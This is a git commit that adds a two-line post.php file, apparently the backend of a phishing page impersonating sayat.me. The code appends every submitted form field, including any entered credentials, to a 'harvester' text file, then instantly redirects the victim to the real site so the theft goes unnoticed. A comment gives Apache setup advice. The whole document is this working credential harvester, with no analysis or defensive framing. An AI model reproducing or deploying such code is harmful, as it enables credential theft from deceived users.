6062dda89e9f70c509ff2686be66fea19bb62e7a
Sandy1999 <Sandyrockstar19@gmail.com>
2017-04-11 18:30:38 +0000

    Add files via upload

---
+++ post.php
@@ -0,0 +1,2 @@
+<?php $file = 'harvester_2017-04-11 21:27:15.649403.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=https://sayat.me" />
+/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */
